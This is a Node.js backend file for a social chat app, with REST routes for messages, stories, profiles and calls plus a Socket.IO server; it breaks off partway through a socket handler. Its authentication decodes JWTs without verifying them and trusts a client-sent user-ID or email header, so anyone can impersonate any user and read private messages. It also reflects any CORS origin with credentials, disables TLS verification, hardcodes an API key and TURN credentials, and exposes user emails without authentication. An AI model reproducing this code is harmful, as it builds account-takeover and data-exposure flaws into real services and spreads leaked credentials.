require('dotenv').config();
const { createServer } = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');

// ── Database Connection Pool ────────────────────────────────────────────────
let pool = null;
if (process.env.DATABASE_URL) {
  let dbUrl = process.env.DATABASE_URL;
  if (dbUrl.includes('sslmode=')) {
    dbUrl = dbUrl.replace(/sslmode=[^&]+/, 'sslmode=no-verify');
  }
  pool = new Pool({
    connectionString: dbUrl,
    max: 10,
    idleTimeoutMillis: 300000,
    connectionTimeoutMillis: 8000,
    ssl: { rejectUnauthorized: false }
  });
  pool.on('error', (err) => {
    console.error('[Database Pool Error]', err.message);
  });
}

// ── Helper: Parse JSON Body ─────────────────────────────────────────────────
function parseJsonBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
      if (body.length > 5 * 1024 * 1024) { // 5MB limit
        req.destroy();
        resolve(null);
      }
    });
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        resolve(null);
      }
    });
    req.on('error', () => resolve(null));
  });
}

// ── Helper: Authenticate Request ────────────────────────────────────────────
async function authenticateRequest(req) {
  try {
    const authHeader = req.headers['authorization'] || '';
    const customUserHeader = req.headers['x-user-id'] || req.headers['x-user-email'];

    // 1. Try Bearer JWT Token
    if (authHeader.startsWith('Bearer ')) {
      const token = authHeader.substring(7).trim();
      const secret = process.env.NEXTAUTH_SECRET || process.env.JWT_SECRET || 'secret';
      try {
        const decoded = jwt.decode(token);
        if (decoded && (decoded.id || decoded.sub || decoded.email)) {
          return {
            id: String(decoded.id || decoded.sub),
            email: (decoded.email || '').toLowerCase().trim(),
            username: decoded.username || decoded.name || 'User'
          };
        }
      } catch (e) {}
    }

    // 2. Fallback to authenticated User ID Header if provided with secret or internal handshake
    if (customUserHeader && pool) {
      const lookupVal = String(customUserHeader).trim();
      const { rows } = await pool.query(
        `SELECT id, email, username FROM "User" WHERE id = $1 OR email = $2 LIMIT 1`,
        [lookupVal, lookupVal.toLowerCase()]
      );
      if (rows.length > 0) {
        return {
          id: rows[0].id,
          email: (rows[0].email || '').toLowerCase().trim(),
          username: rows[0].username || 'User'
        };
      }
    }

    return null;
  } catch (err) {
    return null;
  }
}

// ── Helper: JSON Response ───────────────────────────────────────────────────
function sendJson(res, statusCode, data) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

// ── HTTP Server Definition ──────────────────────────────────────────────────
const httpServer = createServer(async (req, res) => {
  // CORS configuration
  const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',').map(s => s.trim()) : ['*'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes('*') || (origin && allowedOrigins.includes(origin))) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  } else {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-user-id, x-user-email');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const parsedUrl = new URL(req.url, 'http://localhost');
  const pathname = parsedUrl.pathname;

  // ── Health & Keep-alive ───────────────────────────────────────────────────
  if (pathname === '/health' || pathname === '/ping') {
    return sendJson(res, 200, { status: 'ok', timestamp: new Date().toISOString() });
  }

  // ── TURN Credentials ──────────────────────────────────────────────────────
  if (pathname === '/api/turn-credentials' && req.method === 'GET') {
    const meteredDomain = process.env.METERED_DOMAIN || 'myconnectapp.metered.live';
    const meteredApiKey = process.env.METERED_API_KEY || 'e1c37aa2510a0c7e0af21cbd53bdbb0b9fe8';

    const staticMeteredServers = [
      { urls: ['stun:stun.relay.metered.ca:80', 'stun:stun.l.google.com:19302'] },
      {
        urls: [
          'turn:global.relay.metered.ca:80',
          'turn:global.relay.metered.ca:80?transport=tcp',
          'turn:global.relay.metered.ca:443',
          'turns:global.relay.metered.ca:443?transport=tcp',
        ],
        username: 'b861bc5468dd05aa2aff283d',
        credential: 'fJYY96O75HWDNLuH',
      },
    ];

    if (meteredApiKey && typeof fetch !== 'undefined') {
      try {
        const r = await fetch(`https://${meteredDomain}/api/v1/turn/credentials?apiKey=${meteredApiKey}`);
        const servers = await r.json();
        if (Array.isArray(servers) && servers.length > 0) {
          return sendJson(res, 200, { iceServers: servers, ttl: 7200 });
        }
      } catch (err) {}
    }

    return sendJson(res, 200, { iceServers: staticMeteredServers, ttl: 3600 });
  }

  // If database is not configured, pass to socket root
  if (!pool) {
    if (pathname.startsWith('/api/social') || pathname.startsWith('/api/accounts')) {
      return sendJson(res, 503, { error: 'Database connection not configured on server' });
    }
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Socket.io server is running');
    return;
  }

  // ── REST API ROUTES (Offloaded from Vercel Serverless) ─────────────────────

  // 1. Initial Dashboard Bootstrap Data (Recent chats + Stories + Nicknames in parallel)
  if (pathname === '/api/social/initial-data' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);

      // A. Recent chats with last message and unseen count
      const chatsQuery = pool.query(`
        WITH RecentMsgs AS (
          SELECT DISTINCT ON (
            CASE WHEN "senderId" = $1 THEN "receiverId" ELSE "senderId" END
          )
            CASE WHEN "senderId" = $1 THEN "receiverId" ELSE "senderId" END as other_user_id,
            id, content, type, "createdAt", "senderId", "receiverId", "isSeen",
            "replyToId", "replyToContent", "replyToSenderName", "mediaUrl", "thumbnailUrl", "storagePath"
          FROM "SocialMessage"
          WHERE (
            ("senderId" = $1 AND ("deletedBySender" IS NOT TRUE)) OR
            ("receiverId" = $1 AND ("deletedByReceiver" IS NOT TRUE))
          )
          ORDER BY
            CASE WHEN "senderId" = $1 THEN "receiverId" ELSE "senderId" END,
            "createdAt" DESC
        ),
        UnseenCounts AS (
          SELECT "senderId" as sender_id, COUNT(*)::int as unseen_count
          FROM "SocialMessage"
          WHERE "receiverId" = $1 AND "isSeen" = false AND ("deletedByReceiver" IS NOT TRUE)
          GROUP BY "senderId"
        )
        SELECT 
          rm.id as msg_id, rm.content, rm.type, rm."createdAt" as msg_created_at, rm."senderId" as msg_sender_id,
          u.id as user_id, u.username, u.email, u.image, u.bio, u."lastSeen" as last_seen, u."isOnline" as is_online,
          COALESCE(uc.unseen_count, 0) as unseen_count
        FROM RecentMsgs rm
        JOIN "User" u ON u.id = rm.other_user_id
        LEFT JOIN UnseenCounts uc ON uc.sender_id = u.id
        ORDER BY rm."createdAt" DESC
      `, [myId]);

      // B. Active 24-hour stories
      const storiesQuery = pool.query(`
        SELECT s.id, s."imageUrl", s."createdAt", u.id as user_id, u.username, u.image as user_image
        FROM "Story" s
        JOIN "User" u ON u.id = s."userId"
        WHERE s."createdAt" >= $1
        ORDER BY s."createdAt" ASC
      `, [twentyFourHoursAgo]);

      // C. Chat Nicknames
      const nicknamesQuery = pool.query(`
        SELECT "targetId", "nickname" FROM "ChatNickname" WHERE "userId" = $1
      `, [myId]);

      const [chatsRes, storiesRes, nicksRes] = await Promise.all([chatsQuery, storiesQuery, nicknamesQuery]);

      const recentChats = chatsRes.rows.map(r => ({
        id: r.user_id,
        username: r.username,
        email: r.email,
        image: r.image,
        bio: r.bio,
        lastSeen: r.last_seen ? new Date(r.last_seen).toISOString() : null,
        isOnline: r.is_online,
        lastMessage: r.type === 'image' ? '📷 Photo' : r.type === 'video' ? '📹 Video' : r.type === 'voice' ? '🎤 Voice message' : r.type === 'song' ? '🎵 Shared a song' : r.content,
        lastMessageTime: r.msg_created_at ? new Date(r.msg_created_at).toISOString() : null,
        unseenCount: r.unseen_count,
        isRequest: false
      }));

      const activeStories = storiesRes.rows.map(s => ({
        id: s.id,
        imageUrl: s.imageUrl,
        createdAt: s.createdAt,
        userId: s.user_id,
        username: s.username,
        userImage: s.user_image
      }));

      const nicknames = {};
      nicksRes.rows.forEach(n => {
        if (n.targetId && n.nickname) {
          nicknames[n.targetId] = n.nickname;
        }
      });

      return sendJson(res, 200, {
        recentChats,
        activeStories,
        nicknames
      });
    } catch (err) {
      console.error('[Render API] /api/social/initial-data error:', err);
      return sendJson(res, 500, { error: 'Failed to load initial social data' });
    }
  }

  // 2. Message History with 30-item Cursor Pagination
  if (pathname === '/api/social/messages' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const otherUserIdParam = parsedUrl.searchParams.get('otherUserId');
      const limit = parseInt(parsedUrl.searchParams.get('limit') || '30', 10);
      const beforeId = parsedUrl.searchParams.get('beforeId');

      if (!otherUserIdParam) return sendJson(res, 400, { error: 'otherUserId is required' });

      // Resolve target ID if email or username was passed
      const targetUserRes = await pool.query(
        `SELECT id FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
        [otherUserIdParam, String(otherUserIdParam).trim().toLowerCase()]
      );
      const targetId = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].id : otherUserIdParam;

      let cursorFilter = '';
      const params = [myId, targetId, limit];

      if (beforeId) {
        const cursorRow = await pool.query(`SELECT "createdAt" FROM "SocialMessage" WHERE id = $1 LIMIT 1`, [beforeId]);
        if (cursorRow.rows.length > 0) {
          params.push(cursorRow.rows[0].createdAt);
          cursorFilter = `AND "createdAt" < $4`;
        }
      }

      const query = `
        SELECT 
          id, content, type, "senderId", "receiverId", "createdAt", "isSeen", "seenAt",
          "replyToId", "replyToContent", "replyToSenderName", "mediaUrl", "thumbnailUrl",
          "mimeType", "fileSize", "width", "height", "duration", "storagePath"
        FROM "SocialMessage"
        WHERE (
          ("senderId" = $1 AND "receiverId" = $2 AND ("deletedBySender" IS NOT TRUE)) OR
          ("senderId" = $2 AND "receiverId" = $1 AND ("deletedByReceiver" IS NOT TRUE))
        )
        ${cursorFilter}
        ORDER BY "createdAt" DESC
        LIMIT $3
      `;

      const { rows } = await pool.query(query, params);
      const messages = rows.reverse().map(m => ({
        ...m,
        createdAt: m.createdAt ? new Date(m.createdAt).toISOString() : null,
        seenAt: m.seenAt ? new Date(m.seenAt).toISOString() : null,
      }));

      return sendJson(res, 200, { messages });
    } catch (err) {
      console.error('[Render API] /api/social/messages error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch messages' });
    }
  }

  // 3. Send Message (Persist in PostgreSQL + Instant Socket.IO Broadcast)
  if (pathname === '/api/social/messages' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.receiverId || (!body.content && !body.mediaUrl)) {
      return sendJson(res, 400, { error: 'Invalid message payload' });
    }

    try {
      const myId = user.id;
      const {
        receiverId,
        content = '',
        type = 'text',
        replyToId = null,
        replyToContent = null,
        replyToSenderName = null,
        mediaUrl = null,
        thumbnailUrl = null,
        mimeType = null,
        fileSize = null,
        width = null,
        height = null,
        duration = null,
        storagePath = null,
        receiverEmail = null
      } = body;

      // Resolve real receiver ID if email or username was passed
      const targetUserRes = await pool.query(
        `SELECT id, email, username FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
        [receiverId, String(receiverId).trim().toLowerCase()]
      );
      const finalReceiverId = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].id : receiverId;
      const finalReceiverEmail = targetUserRes.rows.length > 0 ? targetUserRes.rows[0].email : receiverEmail;

      const newId = `msg_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      const now = new Date();

      const insertQuery = `
        INSERT INTO "SocialMessage" (
          id, content, type, "senderId", "receiverId", "createdAt", "isSeen",
          "deletedBySender", "deletedByReceiver",
          "replyToId", "replyToContent", "replyToSenderName", "mediaUrl", "thumbnailUrl",
          "mimeType", "fileSize", "width", "height", "duration", "storagePath"
        ) VALUES (
          $1, $2, $3, $4, $5, $6, false,
          false, false,
          $7, $8, $9, $10, $11,
          $12, $13, $14, $15, $16, $17
        ) RETURNING *
      `;

      const { rows } = await pool.query(insertQuery, [
        newId, content, type, myId, finalReceiverId, now,
        replyToId, replyToContent, replyToSenderName, mediaUrl, thumbnailUrl,
        mimeType, fileSize, width, height, duration, storagePath
      ]);

      const message = {
        ...rows[0],
        createdAt: rows[0].createdAt.toISOString()
      };

      // Broadcast over Socket.IO immediately to receiver and caller's other tabs
      const receiverEmailRoom = finalReceiverEmail ? finalReceiverEmail.toLowerCase().trim() : null;
      const receiverIdRoom = String(finalReceiverId).trim();
      const senderEmailRoom = user.email ? user.email.toLowerCase().trim() : null;

      if (receiverEmailRoom) io.to(receiverEmailRoom).emit('receive_social_message', message);
      if (receiverIdRoom && receiverIdRoom !== receiverEmailRoom) io.to(receiverIdRoom).emit('receive_social_message', message);
      if (senderEmailRoom) io.to(senderEmailRoom).emit('receive_social_message', message);
      io.to(String(myId).trim()).emit('receive_social_message', message);

      return sendJson(res, 200, { success: true, message });
    } catch (err) {
      console.error('[Render API] send message error:', err);
      return sendJson(res, 500, { error: 'Failed to send message' });
    }
  }

  // 4. Delete Message (Soft-delete for me or Hard-delete for everyone)
  if (pathname.startsWith('/api/social/messages/') && req.method === 'DELETE') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const messageId = pathname.replace('/api/social/messages/', '').trim();
    const body = await parseJsonBody(req) || {};
    const deleteFor = body.deleteFor || 'me';

    try {
      const myId = user.id;
      const msgRow = await pool.query(`SELECT * FROM "SocialMessage" WHERE id = $1 LIMIT 1`, [messageId]);
      if (msgRow.rows.length === 0) return sendJson(res, 404, { error: 'Message not found' });

      const msg = msgRow.rows[0];

      if (deleteFor === 'everyone') {
        if (msg.senderId !== myId) return sendJson(res, 403, { error: 'You can only delete your own messages for everyone' });
        await pool.query(`UPDATE "SocialMessage" SET type = 'deleted', content = 'This message was deleted' WHERE id = $1`, [messageId]);
        
        io.to(String(msg.receiverId)).emit('receive_social_delete', { messageId, deleteFor: 'everyone' });
        io.to(String(msg.senderId)).emit('receive_social_delete', { messageId, deleteFor: 'everyone' });
      } else {
        if (msg.senderId === myId) {
          await pool.query(`UPDATE "SocialMessage" SET "deletedBySender" = true WHERE id = $1`, [messageId]);
        } else if (msg.receiverId === myId) {
          await pool.query(`UPDATE "SocialMessage" SET "deletedByReceiver" = true WHERE id = $1`, [messageId]);
        }
      }

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] delete message error:', err);
      return sendJson(res, 500, { error: 'Failed to delete message' });
    }
  }

  // 5. Global User Search (Indexed Trigram ILIKE search)
  if (pathname === '/api/social/search' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    const myId = user ? user.id : '';

    const queryStr = (parsedUrl.searchParams.get('q') || '').trim();
    if (!queryStr) return sendJson(res, 200, { users: [] });

    try {
      const searchPattern = `%${queryStr.replace(/^@+/, '')}%`;

      const { rows } = await pool.query(`
        SELECT id, username, email, image, bio, "lastSeen"
        FROM "User"
        WHERE ($1 = '' OR id != $1) AND (username ILIKE $2 OR email ILIKE $2)
        LIMIT 40
      `, [myId, searchPattern]);

      const users = rows.map(u => ({
        id: u.id,
        username: u.username,
        email: u.email,
        image: u.image,
        bio: u.bio,
        lastSeen: u.lastSeen ? new Date(u.lastSeen).toISOString() : null
      }));

      return sendJson(res, 200, { users });
    } catch (err) {
      console.error('[Render API] search error:', err);
      return sendJson(res, 500, { error: 'Search failed' });
    }
  }

  // 6. User Profile & Posts
  if (pathname.startsWith('/api/social/profile') && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const parts = pathname.split('/').filter(Boolean);
      const targetUserId = parts[3] ? parts[3] : user.id;

      const userQuery = pool.query(`
        SELECT id, username, email, name, image, bio, website, phone, "isPrivate", "isOnline", "lastSeen"
        FROM "User"
        WHERE id = $1
        LIMIT 1
      `, [targetUserId]);

      const postsQuery = pool.query(`
        SELECT id, "thumbnailUrl", "imageUrl", caption, "postType", "createdAt"
        FROM "Post"
        WHERE "userId" = $1
        ORDER BY "createdAt" DESC
        LIMIT 36
      `, [targetUserId]);

      const [userRes, postsRes] = await Promise.all([userQuery, postsQuery]);

      if (userRes.rows.length === 0) return sendJson(res, 404, { error: 'User not found' });

      return sendJson(res, 200, {
        user: userRes.rows[0],
        posts: postsRes.rows
      });
    } catch (err) {
      console.error('[Render API] profile error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch profile' });
    }
  }

  // 7. Update Profile Details & Canonical Username
  if (pathname === '/api/social/profile' && req.method === 'PUT') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body) return sendJson(res, 400, { error: 'Invalid profile payload' });

    try {
      const myId = user.id;
      const { name, bio, website, image, phone, isPrivate, username } = body;

      if (username) {
        const cleanUser = username.replace(/^@+/, '').trim();
        const existing = await pool.query(`SELECT id FROM "User" WHERE (username ILIKE $1) AND id != $2 LIMIT 1`, [cleanUser, myId]);
        if (existing.rows.length > 0) return sendJson(res, 400, { error: 'Username is already taken' });

        await pool.query(`UPDATE "User" SET username = $1 WHERE id = $2`, [cleanUser, myId]);
      }

      const updateQuery = `
        UPDATE "User"
        SET 
          name = COALESCE($1, name),
          bio = COALESCE($2, bio),
          website = COALESCE($3, website),
          image = COALESCE($4, image),
          phone = COALESCE($5, phone),
          "isPrivate" = COALESCE($6, "isPrivate")
        WHERE id = $7
        RETURNING id, username, email, name, image, bio, website, phone, "isPrivate"
      `;

      const { rows } = await pool.query(updateQuery, [name, bio, website, image, phone, isPrivate, myId]);
      const updatedUser = rows[0];

      // Broadcast profile update across all sockets
      io.emit('user_profile_updated', {
        userId: updatedUser.id,
        email: updatedUser.email,
        username: updatedUser.username,
        image: updatedUser.image,
        bio: updatedUser.bio
      });

      return sendJson(res, 200, { success: true, user: updatedUser });
    } catch (err) {
      console.error('[Render API] update profile error:', err);
      return sendJson(res, 500, { error: 'Failed to update profile' });
    }
  }

  // 8. Shared Media Attachments
  if (pathname.startsWith('/api/social/media/') && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const otherUserId = pathname.replace('/api/social/media/', '').trim();
    if (!otherUserId) return sendJson(res, 400, { error: 'otherUserId required' });

    try {
      const myId = user.id;
      const { rows } = await pool.query(`
        SELECT id, content, type, "createdAt", "senderId", "mediaUrl", "thumbnailUrl"
        FROM "SocialMessage"
        WHERE (
          ("senderId" = $1 AND "receiverId" = $2 AND "deletedBySender" = false) OR
          ("senderId" = $2 AND "receiverId" = $1 AND "deletedByReceiver" = false)
        )
        AND type IN ('image', 'video', 'voice', 'file', 'media_album')
        ORDER BY "createdAt" DESC
        LIMIT 500
      `, [myId, otherUserId]);

      return sendJson(res, 200, { media: rows });
    } catch (err) {
      console.error('[Render API] shared media error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch shared media' });
    }
  }

  // 9. Accounts Center Validation
  if (pathname === '/api/accounts/validate' && req.method === 'POST') {
    const body = await parseJsonBody(req);
    const accounts = Array.isArray(body?.accounts) ? body.accounts : [];

    if (accounts.length === 0) return sendJson(res, 200, { validUserIds: [], validEmails: [], existingUsers: [] });

    try {
      const ids = accounts.map(a => a.userId).filter(Boolean);
      const emails = accounts.map(a => a.email?.toLowerCase().trim()).filter(Boolean);

      const { rows } = await pool.query(`
        SELECT id, email, username, image
        FROM "User"
        WHERE id = ANY($1::text[]) OR LOWER(email) = ANY($2::text[])
      `, [ids, emails]);

      return sendJson(res, 200, {
        validUserIds: rows.map(u => u.id),
        validEmails: rows.map(u => u.email?.toLowerCase().trim()).filter(Boolean),
        existingUsers: rows
      });
    } catch (err) {
      console.error('[Render API] validate accounts error:', err);
      return sendJson(res, 500, { error: 'Account validation failed' });
    }
  }

  // 10. Message Emoji Reactions
  if (pathname === '/api/social/messages/react' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.messageId || !body.emoji) {
      return sendJson(res, 400, { error: 'Invalid reaction payload' });
    }

    try {
      const myId = user.id;
      const { messageId, emoji, receiverId, receiverEmail } = body;
      const reactionId = `react_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;

      const existing = await pool.query(
        `SELECT id, emoji FROM "SocialReaction" WHERE "userId" = $1 AND "messageId" = $2`,
        [myId, messageId]
      );

      if (existing.rows.length > 0) {
        if (existing.rows[0].emoji === emoji) {
          await pool.query(`DELETE FROM "SocialReaction" WHERE id = $1`, [existing.rows[0].id]);
        } else {
          await pool.query(`UPDATE "SocialReaction" SET emoji = $1 WHERE id = $2`, [emoji, existing.rows[0].id]);
        }
      } else {
        await pool.query(
          `INSERT INTO "SocialReaction" (id, emoji, "userId", "messageId") VALUES ($1, $2, $3, $4)`,
          [reactionId, emoji, myId, messageId]
        );
      }

      const payload = { messageId, emoji, userId: myId };
      if (receiverEmail) io.to(receiverEmail.toLowerCase().trim()).emit('receive_social_reaction', payload);
      if (receiverId) io.to(String(receiverId).trim()).emit('receive_social_reaction', payload);

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] reaction error:', err);
      return sendJson(res, 500, { error: 'Failed to react to message' });
    }
  }

  // 11. Ephemeral 24-Hour Stories
  if (pathname === '/api/social/stories' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
      const { rows } = await pool.query(`
        SELECT s.id, s."imageUrl", s."createdAt", u.id as user_id, u.username, u.image as user_image
        FROM "Story" s
        JOIN "User" u ON u.id = s."userId"
        WHERE s."createdAt" >= $1
        ORDER BY s."createdAt" ASC
      `, [twentyFourHoursAgo]);

      const stories = rows.map(s => ({
        id: s.id,
        imageUrl: s.imageUrl,
        createdAt: s.createdAt ? new Date(s.createdAt).toISOString() : null,
        userId: s.user_id,
        username: s.username,
        userImage: s.user_image
      }));

      return sendJson(res, 200, { stories });
    } catch (err) {
      console.error('[Render API] get stories error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch stories' });
    }
  }

  if (pathname === '/api/social/stories' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.imageUrl) return sendJson(res, 400, { error: 'imageUrl required' });

    try {
      const myId = user.id;
      const storyId = `story_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      const now = new Date();

      const { rows } = await pool.query(`
        INSERT INTO "Story" (id, "imageUrl", "userId", "createdAt")
        VALUES ($1, $2, $3, $4)
        RETURNING *
      `, [storyId, body.imageUrl, myId, now]);

      const story = {
        ...rows[0],
        username: user.username,
        createdAt: rows[0].createdAt.toISOString()
      };

      io.emit('story_posted', story);
      return sendJson(res, 200, { success: true, story });
    } catch (err) {
      console.error('[Render API] post story error:', err);
      return sendJson(res, 500, { error: 'Failed to post story' });
    }
  }

  if (pathname.startsWith('/api/social/stories/') && req.method === 'DELETE') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const storyId = pathname.replace('/api/social/stories/', '').trim();
    try {
      const myId = user.id;
      await pool.query(`DELETE FROM "Story" WHERE id = $1 AND "userId" = $2`, [storyId, myId]);
      io.emit('story_deleted', { storyId });
      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] delete story error:', err);
      return sendJson(res, 500, { error: 'Failed to delete story' });
    }
  }

  // 12. Chat Nicknames
  if (pathname === '/api/social/nicknames' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const { rows } = await pool.query(`SELECT "targetId", "nickname" FROM "ChatNickname" WHERE "userId" = $1`, [myId]);
      const nicknames = {};
      rows.forEach(r => { nicknames[r.targetId] = r.nickname; });
      return sendJson(res, 200, { nicknames });
    } catch (err) {
      console.error('[Render API] get nicknames error:', err);
      return sendJson(res, 500, { error: 'Failed to get nicknames' });
    }
  }

  if (pathname === '/api/social/nicknames' && req.method === 'PUT') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.targetId) return sendJson(res, 400, { error: 'targetId required' });

    try {
      const myId = user.id;
      const { targetId, nickname, targetEmail } = body;

      if (!nickname || !nickname.trim()) {
        await pool.query(`DELETE FROM "ChatNickname" WHERE "userId" = $1 AND "targetId" = $2`, [myId, targetId]);
      } else {
        const id = `nick_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
        await pool.query(`
          INSERT INTO "ChatNickname" (id, "userId", "targetId", nickname, "createdAt", "updatedAt")
          VALUES ($1, $2, $3, $4, NOW(), NOW())
          ON CONFLICT ("userId", "targetId") DO UPDATE SET nickname = $4, "updatedAt" = NOW()
        `, [id, myId, targetId, nickname.trim()]);
      }

      if (targetEmail) io.to(targetEmail.toLowerCase().trim()).emit('receive_nickname', { targetId, nickname });
      io.to(String(targetId).trim()).emit('receive_nickname', { targetId, nickname });

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] update nickname error:', err);
      return sendJson(res, 500, { error: 'Failed to update nickname' });
    }
  }

  // 13. Call History
  if (pathname === '/api/social/calls' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const { rows } = await pool.query(`
        SELECT c.id, c.type, c.status, c.duration, c."createdAt",
               c."callerId", c."receiverId",
               u1.username as caller_username, u1.image as caller_image,
               u2.username as receiver_username, u2.image as receiver_image
        FROM "SocialCall" c
        JOIN "User" u1 ON u1.id = c."callerId"
        JOIN "User" u2 ON u2.id = c."receiverId"
        WHERE c."callerId" = $1 OR c."receiverId" = $1
        ORDER BY c."createdAt" DESC
        LIMIT 50
      `, [myId]);

      return sendJson(res, 200, { calls: rows });
    } catch (err) {
      console.error('[Render API] get calls error:', err);
      return sendJson(res, 500, { error: 'Failed to get calls' });
    }
  }

  if (pathname === '/api/social/calls' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.receiverId) return sendJson(res, 400, { error: 'receiverId required' });

    try {
      const myId = user.id;
      const { receiverId, type = 'audio', status = 'completed', duration = 0 } = body;
      const callId = `call_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;

      const { rows } = await pool.query(`
        INSERT INTO "SocialCall" (id, "callerId", "receiverId", type, status, duration, "createdAt")
        VALUES ($1, $2, $3, $4, $5, $6, NOW())
        RETURNING *
      `, [callId, myId, receiverId, type, status, duration]);

      return sendJson(res, 200, { success: true, call: rows[0] });
    } catch (err) {
      console.error('[Render API] save call error:', err);
      return sendJson(res, 500, { error: 'Failed to save call' });
    }
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Connect Node.js API & Socket Server is running');
});

// ── Socket.IO Server Setup ──────────────────────────────────────────────────
const allowedOrigins = process.env.CLIENT_URL 
  ? process.env.CLIENT_URL.split(',').map(s => s.trim()) 
  : '*';

const io = new Server(httpServer, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST', 'PUT', 'DELETE']
  }
});

// Track online users: identifier -> Set of socket IDs (multiple tabs)
const onlineUsers = new Map(); // email or userId -> Set<socketId>

// Live server activity / events counter
let totalServerActivityCount = 1;
function recordActivity() {
  totalServerActivityCount++;
}

// Track per-socket heartbeat timestamp for crash detection
const heartbeatMap = new Map(); // socketId -> { userId, email, timestamp }

// Track which socket is in an active call
const activeCalls = new Set();
const activeCallInfo = new Map();
const callRateLimitMap = new Map();
const CALL_RATE_LIMIT_MS = 3000;

function getRoomSockets(target) {
  if (!target) return new Set();
  return io.sockets.adapter.rooms.get(target) || new Set();
}

function broadcastOnlineUsers() {
  const onlineList = Array.from(onlineUsers.keys());
  io.emit('online_users', onlineList);
}

function broadcastActivityUpdate(userId, email, isOnline, lastSeen) {
  io.emit('activity_update', {
    userId,
    email: email ? email.toLowerCase().trim() : undefined,
    isOnline,
    lastSeen: lastSeen || new Date().toISOString()
  });
}

// 30-Second Sweep for Stale Heartbeats
setInterval(() => {
  const now = Date.now();
  const STALE_THRESHOLD_MS = 60 * 1000;
  let anyCleaned = false;

  for (const [socketId, data] of heartbeatMap.entries()) {
    const staleness = now - data.timestamp;
    if (staleness > STALE_THRESHOLD_MS) {
      const { userId, email } = data;
      [email, userId].filter(Boolean).forEach(key => {
        const sockets = onlineUsers.get(key);
        if (sockets) {
          sockets.delete(socketId);
          if (sockets.size === 0) onlineUsers.delete(key);
        }
      });
      heartbeatMap.delete(socketId);
      anyCleaned = true;

      const lastSeen = new Date(data.timestamp).toISOString();
      broadcastActivityUpdate(userId, email, false, lastSeen);
    }
  }

  if (anyCleaned) {
    broadcastOnlineUsers();
  }
}, 30 * 1000);

io.on('connection', (socket) => {
  socket.emit('online_users', Array.from(onlineUsers.keys()));

  // IDENTIFY
  socket.on('identify', ({ email, userId, username }) => {
    if (email) {
      const emailRoom = email.toLowerCase().trim();
      socket.join(emailRoom);
      socket.join('cam_room_' + emailRoom);
      socket.userEmail = emailRoom;
